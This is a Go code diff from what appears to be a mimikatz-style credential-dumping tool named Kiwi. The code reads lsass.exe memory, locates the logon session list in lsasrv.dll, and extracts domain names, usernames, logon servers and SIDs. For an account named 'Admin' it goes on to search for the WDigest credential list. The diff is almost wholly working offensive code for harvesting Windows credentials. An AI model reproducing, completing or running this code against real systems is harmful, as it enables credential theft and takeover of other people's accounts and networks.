@@ -143,7 +143,7 @@ var (
 
 // x86
 
-func (kiwi *Kiwi) searchSessionListAddress(pHandle windows.Handle, patch *patchGeneric) error {
+func (kiwi *Kiwi) searchLogonSessionListAddress(pHandle windows.Handle, patch *patchGeneric) error {
 	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
@@ -157,7 +157,7 @@ func (kiwi *Kiwi) searchSessionListAddress(pHandle windows.Handle, patch *patchG
 	// search logon session list pattern
 	index := bytes.Index(memory, patch.search.data)
 	if index == -1 {
-		return errors.WithMessage(err, "failed to search logon session list pattern")
+		return errors.WithMessage(err, "failed to search logon session list reference pattern")
 	}
 	// read logon session list address
 	address := lsasrv.address + uintptr(index+patch.offsets.off0)
@@ -270,13 +270,13 @@ type LogonSession struct {
 	Credentials []*Credential
 }
 
-func (kiwi *Kiwi) getSessionList(pHandle windows.Handle, patch *patchGeneric) ([]*LogonSession, error) {
+func (kiwi *Kiwi) getLogonSessionList(pHandle windows.Handle, patch *patchGeneric) ([]*LogonSession, error) {
 	kiwi.mu.Lock()
 	defer kiwi.mu.Unlock()
 	if kiwi.logonSessionListAddr == 0 {
-		err := kiwi.searchSessionListAddress(pHandle, patch)
+		err := kiwi.searchLogonSessionListAddress(pHandle, patch)
 		if err != nil {
-			return nil, errors.WithMessage(err, "failed to search session list address")
+			return nil, errors.WithMessage(err, "failed to search logon session list address")
 		}
 	}
 	// get session list count
@@ -284,7 +284,7 @@ func (kiwi *Kiwi) getSessionList(pHandle windows.Handle, patch *patchGeneric) ([
 	address := kiwi.logonSessionListCountAddr
 	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), unsafe.Sizeof(count))
 	if err != nil {
-		return nil, errors.WithMessage(err, "failed to read session list count")
+		return nil, errors.WithMessage(err, "failed to read logon session list count")
 	}
 	kiwi.log(logger.Debug, "logon session list count is", count)
 	// get session list
@@ -296,69 +296,66 @@ func (kiwi *Kiwi) getSessionList(pHandle windows.Handle, patch *patchGeneric) ([
 	listAddr := kiwi.logonSessionListAddr - listEntrySize
 	for i := uint32(0); i < count; i++ {
 		listAddr += listEntrySize
-		// get session data address
+		// get logon session data address
 		var addr uintptr
 		_, err = api.ReadProcessMemory(pHandle, listAddr, (*byte)(unsafe.Pointer(&addr)), unsafe.Sizeof(addr))
 		if err != nil {
-			return nil, errors.WithMessage(err, "failed to read session data address")
+			return nil, errors.WithMessage(err, "failed to read logon session data address")
 		}
 		for {
-			if listAddr == addr {
+			if addr == listAddr {
 				break
 			}
-
-			// read session data
+			// read logon session data
 			buf := make([]byte, enum.size)
 			_, err = api.ReadProcessMemory(pHandle, addr, &buf[0], enum.size)
 			if err != nil {
-				return nil, errors.WithMessage(err, "failed to read session data")
+				return nil, errors.WithMessage(err, "failed to read logon session data")
 			}
-
 			domainNameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToDomainName]))
 			domainName, err := api.ReadLSAUnicodeString(pHandle, domainNameLus)
 			if err != nil {
 				return nil, err
 			}
-			fmt.Println("domain name:", domainName)
-
 			usernameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToUsername]))
 			username, err := api.ReadLSAUnicodeString(pHandle, usernameLus)
 			if err != nil {
 				return nil, err
 			}
-			fmt.Println("user name:", username)
-
 			logonServerLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToLogonServer]))
 			logonServer, err := api.ReadLSAUnicodeString(pHandle, logonServerLus)
 			if err != nil {
 				return nil, err
 			}
-			fmt.Println("logon server:", logonServer)
-
-			sid, err := readSID(pHandle, *(*uintptr)(unsafe.Pointer(&buf[enum.offsetToSID])))
+			sid, err := readSIDFromLsass(pHandle, *(*uintptr)(unsafe.Pointer(&buf[enum.offsetToSID])))
 			if err != nil {
-				return nil, err
+				kiwi.log(logger.Debug, "failed to read SID from lsass.exe:", err)
+			}
+			session := LogonSession{
+				Domain:      domainName,
+				Username:    username,
+				LogonServer: logonServer,
+				SID:         sid,
 			}
 
-			fmt.Println("SID:", sid)
-
+			fmt.Println("Domain:", session.Domain)
+			fmt.Println("Username:", session.Username)
+			fmt.Println("Logon server:", session.LogonServer)
+			fmt.Println("SID:", session.SID)
 			fmt.Println()
-			break
+
+			if username == "Admin" {
+				kiwi.searchWdigestListAddress(pHandle)
+			}
+
+			addr = *(*uintptr)(unsafe.Pointer(&buf[0]))
 		}
-
-		// session := LogonSession{
-		//
-		//
-		// 	Username:
-		//
-		// }
-
 	}
 
 	return nil, nil
 }
 
-func readSID(pHandle windows.Handle, address uintptr) (string, error) {
+func readSIDFromLsass(pHandle windows.Handle, address uintptr) (string, error) {
 	var n byte
 	_, err := api.ReadProcessMemory(pHandle, address+1, &n, 1)
 	if err != nil {
